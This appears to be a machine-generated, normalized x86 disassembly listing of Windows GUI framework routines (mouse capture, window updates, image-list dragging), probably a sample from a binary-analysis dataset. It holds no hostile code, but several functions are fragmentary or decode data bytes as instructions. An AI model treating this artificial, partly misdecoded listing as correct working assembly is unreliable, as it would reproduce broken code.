jmp sub_445d78
sub_4397d5
add eax 0xffffff8c
jmp sub_445e64
sub_4397dd
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_4397ea
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_4397f7
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_439804
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_439811
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_43981e
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43982b
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_439838
add eax 0xffffff8c
jmp sub_4474d4
sub_43984a
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405798
sub_439854
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4057ac
sub_439cac
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_439fbf
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_4139f4
retn
sub_439fdc
push 0x15
mov ecx rw-data
call sub_4139b4
retn
sub_43a0c8
call GetCapture
call sub_439dac
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43a32c
push ebx
push eax
push sub_43a4b0
call sub_41ab78
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43a344
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43a374
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41ac2c
pop ebx
retn
sub_43a452
jmp sub_4036f8
sub_43a484
xor eax eax
retn
sub_43a488
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43a4a0
retn
sub_43a4a4
mov eax [ rw-data ]
retn
sub_43a4ac
retn
sub_43a4da
jmp sub_4036f8
sub_43a4df
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45cc50
call sub_403a60
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a4fc
call sub_4034b0
xor eax eax
mov [ rw-data ] eax
retn
sub_43a50c
call sub_4034ac
xor eax eax
mov [ rw-data ] eax
retn
sub_43a51c
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40357c
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_43a5cc
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_43a5e4
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43a630
retn
sub_43a7e8
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403454
pop esi
retn
sub_43a7fc
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403454
pop esi
retn
sub_43a810
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43a81c
mov eax 0x4
retn
sub_43a824
retn
j_sub_4036f8#9
jmp sub_4036f8
sub_43b702
jmp sub_4039ac
sub_43b774
jmp sub_4039ac
sub_43b780
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43b4a8
sub_43b8ff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41dc24
retn
sub_43b915
jmp sub_4039ac
sub_43b93c
jmp sub_4039ac
sub_43b9be
jmp sub_4039ac
sub_43b9e6
jmp sub_4039ac
sub_43b9ed
mov esp ebp
pop ebp
retn
sub_43baa5
jmp sub_4039ac
sub_43bafc
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43bac8
mov [ ebx + 0x58 ] esi
sub_43bc50
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43bc64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43bd4d
jmp sub_4039ac
sub_43bd54
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bdd7
jmp sub_4039ac
sub_43bdde
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43c1ac
xor eax eax
retn
sub_43c1b0
mov al [ eax + 0x58 ]
retn
sub_43c1b4
xor eax eax
retn
sub_43c1b8
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_43c1c0
mov eax [ eax + 0x30 ]
retn
sub_43c264
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43c310
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_43c328
mov [ eax + 0x5d ] dl
retn
sub_43c32c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_43ff0c
sub_43c33c
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43c81f
jmp sub_4039ac
sub_43c826
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c888
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43c90c
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_43ca29
jmp sub_4039ac
sub_43ca30
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43cb2c
push eax
xor ecx ecx
mov edx 0xb037
call sub_43e0d4
retn
sub_43cced
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403454
sub_43cd9e
jmp sub_4039ac
sub_43cda5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ce7c
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_43e0d4
sub_43ce94
push 0x0
xor ecx ecx
mov edx 0xe
call sub_43e0d4
retn
sub_43cea4
push edx
mov edx 0xd
call sub_43e0d4
retn
sub_43ceb0
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_43cec4
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_43cfa5
jmp sub_4039ac
sub_43cfac
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43cfb4
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_43e0d4
sub_43d024
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_43d038
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_43d044
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_43d04c
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_43e0d4
sub_43d070
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_43e0d4
sub_43d094
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_43e0d4
sub_43d0dc
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_43d0e4
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_43e0d4
sub_43d108
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_43e0d4
sub_43d12c
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_43e0d4
sub_43d148
push ebx
mov ebx eax
call sub_43a0c8
cmp ebx eax
sete al
pop ebx
retn
sub_43d180
push esi
mov dl 0x1
mov si 0xffce
call sub_403454
pop esi
retn
sub_43d2ca
jmp sub_4039ac
sub_43d2d1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d3f4
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_43d368
retn
sub_43d448
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_43d45c
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_43d541
jmp sub_4039ac
sub_43d560
xor eax eax
retn
sub_43d564
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43d57c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_43d594
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_43d5b0
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_43d5c8
retn
sub_43d68c
retn
sub_43d690
cmp eax [ rw-data ]
sete al
retn
sub_43d704
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_43d820
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403454
pop esi
pop ebp
retn 0x4
sub_43d860
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43daf7
jmp sub_4039ac
sub_43dafe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43db08
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403454
pop esi
retn
sub_43db1c
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403454
pop esi
retn
sub_43ddeb
jmp sub_4039ac
sub_43de94
push esi
mov si 0xffee
call sub_403454
pop esi
retn
sub_43dea0
mov al 0x1
retn
sub_43e178
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_43c574
retn
sub_43e19c
retn
sub_43e3b5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_417348
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_43e3d0
mov al [ eax + 0x5e ]
xchg edx eax
call sub_419680
retn
sub_43e4c8
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_43eae0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43eae8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43eaf0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43eba8
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43ebc8
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_43d070
mov [ ebx + 0x9a ] 0x1
sub_43ec20
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43d014
mov [ ebx + 0x56 ] 0x1
sub_43ec44
mov [ edx + 0xc ] 0x1
retn
sub_43ec4c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_43e0d4
sub_43ec64
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_43e0d4
sub_43ec7c
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_43eee2
jmp sub_4039ac
sub_43eee9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ef14
mov eax [ r-xdata ]
retn
sub_43f0b0
jmp sub_4039ac
sub_43f0b7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f1d8
mov eax [ eax + 0xb8 ]
retn
sub_43f240
push ebx
mov ebx eax
mov eax ebx
call sub_43d564
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_43f25c
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_43f3f4
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43f424
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_43f42c
call sub_43bfe0
retn
sub_43f52c
jmp sub_4039ac
sub_43f6ec
jmp sub_4039ac
sub_43f73c
jmp sub_4039ac
sub_43f774
retn
sub_43f9fd
jmp sub_4039ac
sub_43fb85
jmp sub_4039ac
sub_43fee7
jmp sub_4039ac
sub_43ff93
jmp sub_4039ac
sub_43ffa0
inc [ eax + 0x160 ]
retn
sub_43ffa8
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_43ffc8
sub_43ffc8
xor edx edx
call sub_43ff0c
retn
sub_440095
jmp sub_4039ac
sub_44009c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44018b
jmp sub_4039ac
sub_4406b2
jmp sub_4039ac
sub_4406b9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440881
jmp sub_4039ac
sub_440888
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44095c
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_440b49
jmp sub_4039ac
sub_440b50
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_440c40
xor eax eax
retn
sub_440ca8
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_43e0d4
sub_440dd6
jmp sub_4036f8
sub_440f0b
jmp sub_4039ac
sub_440f12
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4036f8#8
jmp sub_4036f8
sub_440f21
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45cc50
call sub_403a60
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4414dc
jmp sub_4039ac
sub_4414e3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4414ec
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_4419ea
jmp sub_4039ac
sub_441a3c
push ebx
mov ebx eax
call sub_41c46c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_43e0d4
pop ebx
retn
sub_441a58
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_43e0d4
retn
sub_441a6c
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_43e0d4
retn
sub_441a7c
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_43e0d4
retn
sub_441d28
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_443a18
pop esi
retn
sub_441e3c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_441e8c
pop esi
retn
sub_441e50
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_441f78
pop esi
retn
sub_441e64
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_441e78
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_441f6b
jmp sub_4039ac
sub_441f72
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442002
jmp sub_4039ac
sub_442009
pop ebx
pop ecx
pop ebp
retn
sub_442010
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_442020
retn
sub_442024
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_442044
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_4421a4
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_442274
retn
sub_44238c
jmp sub_4039ac
sub_442393
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44245e
jmp sub_4039ac
sub_442488
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44251a
jmp sub_4039ac
sub_4426ec
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_442990
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_442a6c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_440498
pop esi
retn
sub_442b30
push esi
mov si 0xffc1
call sub_403454
pop esi
retn
sub_442b5c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_442b70
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_442b84
call sub_440458
retn
sub_442b8c
call sub_440458
retn
sub_442b94
call sub_440458
retn
sub_442c3c
push ebx
mov ebx eax
mov eax ebx
call sub_43eaf0
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41d5e4
mov dx 0xb009
mov eax ebx
call sub_440498
pop ebx
retn
sub_442da0
call sub_440458
retn
sub_442da8
call sub_440458
retn
sub_442db0
call sub_440458
retn
sub_442db8
call sub_440458
retn
sub_442e1c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4432b2
jmp sub_4039ac
sub_4432b9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443398
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_44353c
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_43e0d4
retn
sub_4435dc
push ebx
mov ebx eax
mov eax ebx
call sub_443a0c
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_4435f8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_4437d0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_443708
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_443828
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43e0d4
sub_443848
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_43e0d4
sub_44386c
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_443878
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_43e0d4
sub_443924
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_4438c8
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_443a00
jmp sub_4039ac
sub_443a07
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443c26
jmp sub_4039ac
sub_443c2d
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_443d34
call sub_43dea4
retn
sub_444182
jmp sub_4039ac
sub_444218
mov eax [ r-xdata ]
retn
sub_44437f
jmp sub_4039ac
sub_444490
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43e0d4
sub_4447a6
jmp sub_4039ac
sub_4448e8
test [ eax + 0x52 ] 0x4
setne al
retn
sub_444a44
jmp sub_4039ac
sub_444a4b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41dc24
retn
sub_444a67
jmp sub_4039ac
sub_444a74
retn
sub_444b48
mov [ edx + 0xc ] 0xffffffff
retn
sub_444ba6
jmp sub_4039ac
sub_444bad
pop ecx
pop ecx
pop ebp
retn
sub_444c4d
jmp sub_4039ac
sub_444c54
pop ebx
mov esp ebp
pop ebp
retn
sub_444cc0
call sub_440c60
retn
sub_444d53
jmp sub_4039ac
sub_444d5a
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_444f39
jmp sub_4039ac
sub_444f40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44509c
push ebx
mov ebx eax
mov eax ebx
call sub_449da0
or edx 0xffffffff
mov eax ebx
call sub_4451c8
pop ebx
retn
sub_445174
jmp sub_4039ac
sub_4451c8
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_4450b4
sub_445338
push ebx
mov ebx eax
mov eax ebx
call sub_449e58
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_445350
push ebx
mov ebx eax
mov eax ebx
call sub_449e58
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_44543c
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_441898
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_4454d7
jmp sub_4039ac
sub_4454de
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445501
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41dc24
retn
sub_4454fa
jmp sub_4039ac
sub_445501
pop ebx
pop ecx
pop ebp
retn
sub_445508
retn
sub_445570
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_4458dd
jmp sub_4039ac
sub_445ac4
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_445cb0
jmp sub_4039ac
sub_445d60
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_445d74
inc [ eax + 0x6c ]
retn
sub_445d78
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_4475f8
sub_445ed8
call sub_4465d8
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_446883
jmp sub_4039ac
sub_44688a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4468a7
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
sub_4468a0
jmp sub_4039ac
sub_4468a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446b88
jmp sub_4039ac
sub_446b8f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446bac
mov eax [ ebp - 0x4 ]
call sub_41dc24
retn
sub_446ba5
jmp sub_4039ac
sub_446bac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446bc9
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_446bc2
jmp sub_4039ac
sub_446bc9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44707d
jmp sub_4039ac
sub_447084
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44720f
jmp sub_4039ac
sub_447216
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4472cb
jmp sub_4039ac
sub_4472d2
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4473c0
jmp sub_4039ac
sub_447411
jmp sub_4039ac
sub_447418
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4474d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445de4
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_447620
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_445920
